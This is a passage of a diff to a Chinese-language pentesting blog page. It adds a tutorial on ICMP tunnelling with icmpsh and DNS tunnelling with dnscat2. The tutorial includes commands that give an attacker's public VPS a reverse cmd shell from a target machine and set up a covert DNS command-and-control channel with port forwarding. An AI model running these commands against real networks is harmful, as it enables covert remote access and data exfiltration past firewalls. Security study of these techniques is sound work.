+<h4 id="ICMP隧道代理转发"><a href="#ICMP隧道代理转发" class="headerlink" title="ICMP隧道代理转发"></a>ICMP隧道代理转发</h4><p>ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的，要判断是否使用ICMP隧道，我们只需要关注一件事：可以ping通一个外部服务器。如果能到达外部网络，那么很有可能可以建立一个icmp隧道，缺点是需要root/administrator权限</p>
+<h5 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h5><p>具有公网ip的vps上：</p>
+<blockquote>
+<p>git clone <a href="https://github.com/inquisb/icmpsh.git" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh.git</a><br>apt-get install python-impacket<br>sysctl -w net.ipv4.icmp_echo_ignore_all=1<br>python icmpsh_m.py 公网ip地址 内网目标机器ip</p>
+</blockquote>
+<p>目标机器：</p>
+<blockquote>
+<p>icmpsh.exe -t 公网ip地址 -d 500 -b 30 -s 128</p>
+</blockquote>
+<p>就会在具有公网ip的主机上收到一个cmd shell</p>
+<h4 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h4><p>不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。</p>
+<h5 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h5><p>github项目地址：<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a><br>Dnscat2通过建立C&amp;C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用）。他还支持端口转发<br>Server端：</p>
+<blockquote>
+<p>ruby ./dnscat2.rb tunneldomain.com</p>
+</blockquote>
+<p>Client端：</p>
+<blockquote>
+<p>./dnscat2 tunneldomain.com</p>
+</blockquote>
+<p>收到Server端的连接后，可以使用windows命令查看活动会话：</p>
+<blockquote>
+<p>dnscat2&gt; windows<br>0 :: main [active]<br>  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]<br>  1 :: command session (debian)<br>  2 :: sh (debian) [*]</p>
+</blockquote>
+<p>要启动端口转发，请选择一个命令会话session -i:</p>
+<blockquote>
+<p>dnscat2&gt; session -i 1<br>New window created: 1<br>New window created: 1<br>history_size (session) =&gt; 1000</p>
+<p>This is a command session!</p>
+<p>That means you can enter a dnscat2 command such as<br>‘ping’! For a full list of clients, try ‘help’.<br>command session (debian) 1&gt;</p>
+</blockquote>
+<p>使用 listen [lhost:]lport rhost:rport 命令转发端口：</p>
+<blockquote>
+<p>command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80</p>
+</blockquote>
+<p>这将绑定靶机上的8080端口，并将所有链接转发到10.0.0.1:80上。</p>
+<p>具体参考：<a href="https://bl4ck.in/penetration/2016/06/03/%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99.html" target="_blank" rel="noopener">https://bl4ck.in/penetration/2016/06/03/%E9%80%9A%E8%BF%87DNS%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99.html</a></p>
+<p>参考链接：<br><a href="https://www.cnblogs.com/bmjoker/p/10264148.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/10264148.html</a><br><a href="https://www.mozhe.cn/news/detail/26" target="_blank" rel="noopener">https://www.mozhe.cn/news/detail/26</a></p>
 
       
     </div>
@@ -459,8 +462,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/16/Android-动态分析/" rel="next" title="Android-动态分析">
-                <i class="fa fa-chevron-left"></i> Android-动态分析
+              <a href="/2019/04/11/内网渗透入门了解/" rel="next" title="内网渗透入门了解">
+                <i class="fa fa-chevron-left"></i> 内网渗透入门了解
               </a>
             
           </div>
@@ -468,10 +471,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/04/Couchdb 垂直权限绕过漏洞（CVE-2017-12635）/" rel="prev" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）">
-                Couchdb 垂直权限绕过漏洞（CVE-2017-12635） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -594,7 +593,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-容器使用"><span class="nav-number">1.</span> <span class="nav-text">Docker 容器使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-Docker-创建-Web-应用"><span class="nav-number">1.1.</span> <span class="nav-text">使用 Docker 创建 Web 应用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#容器基础操作命令"><span class="nav-number">1.2.</span> <span class="nav-text">容器基础操作命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker-镜像使用"><span class="nav-number">2.</span> <span class="nav-text">Docker 镜像使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#镜像基础操作命令"><span class="nav-number">2.1.</span> <span class="nav-text">镜像基础操作命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Dockerfile创建镜像"><span class="nav-number">3.</span> <span class="nav-text">使用Dockerfile创建镜像</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Dockerfile-结构"><span class="nav-number">3.1.</span> <span class="nav-text">Dockerfile 结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dockerfile-指令"><span class="nav-number">3.2.</span> <span class="nav-text">Dockerfile 指令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dockerfile-创建镜像"><span class="nav-number">3.3.</span> <span class="nav-text">Dockerfile 创建镜像</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#SOCKS-常用代理工具"><span class="nav-number">1.</span> <span class="nav-text">SOCKS 常用代理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Earthworm"><span class="nav-number">1.1.</span> <span class="nav-text">Earthworm</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#reGeorgre"><span class="nav-number">1.2.</span> <span class="nav-text">reGeorgre</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sSocks"><span class="nav-number">1.3.</span> <span class="nav-text">sSocks</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SocksCap64"><span class="nav-number">1.4.</span> <span class="nav-text">SocksCap64</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#proxychains"><span class="nav-number">1.5.</span> <span class="nav-text">proxychains</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-隧道代理转发"><span class="nav-number">2.</span> <span class="nav-text">SSH 隧道代理转发</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh-本地转发"><span class="nav-number">2.1.</span> <span class="nav-text">ssh 本地转发</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh-远程转发"><span class="nav-number">2.2.</span> <span class="nav-text">ssh 远程转发</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ssh动态转发socks代理"><span class="nav-number">2.3.</span> <span class="nav-text">ssh动态转发socks代理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ICMP隧道代理转发"><span class="nav-number">3.</span> <span class="nav-text">ICMP隧道代理转发</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#icmpsh"><span class="nav-number">3.1.</span> <span class="nav-text">icmpsh</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS隧道"><span class="nav-number">4.</span> <span class="nav-text">DNS隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Dnscat2"><span class="nav-number">4.1.</span> <span class="nav-text">Dnscat2</span></a></li></ol></li></ol></div>
             
 
           </div>
